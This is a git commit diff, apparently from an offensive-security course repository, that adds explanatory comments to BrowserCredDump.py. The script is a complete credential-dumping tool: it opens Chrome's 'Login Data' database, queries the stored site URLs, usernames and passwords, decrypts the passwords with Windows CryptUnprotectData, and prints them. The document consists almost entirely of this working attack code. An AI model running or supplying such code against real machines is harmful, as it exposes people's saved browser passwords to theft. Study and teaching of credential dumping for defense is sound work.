201680e7d6faf4ff9fafe605e60298bab7d57727
Ian Pokres <80968123+ianp89@users.noreply.github.com>
2024-07-16 19:15:15 -0400

    Commented on BrowserCredDump.py to explain functionality

--- Part_8/8.1_Credential_Dumping/BrowserCredDump.py
+++ Part_8/8.1_Credential_Dumping/BrowserCredDump.py
@@ -1,14 +1,20 @@
+# This is a credential dumping script for pre-2020 Google Chrome v79.
+
 import sqlite3,win32crypt,os
+# Python libraries sqlite3 and win32crypt allow Python to query with SQL and use built-in Windows encryption methods, respectively.
 
 userdir = os.path.expanduser("~")
 chromepath = os.path.join(userdir,"AppData","Local","Google","Chrome","User Data","Default","Login Data")
+# This gains access to a file that Chrome used to store logon data in.
 
 conn = sqlite3.connect(chromepath)
 c = conn.cursor()
 c.execute("SELECT origin_url, username_value, password_value FROM logins;")
+# This creates a connection to that folder and queries it for the specified information using SQL.
 
 login_data = c.fetchall()
 for URL,username,password in login_data:
     print(password)
     pwd = win32crypt.CryptUnprotectData(password)
     print("%s, %s, %s" % (URL,username,pwd))
+    # This prints the data SELECTed above; win32crypt uses the system password to en-/de-crypt, which is accessible, because logged on.
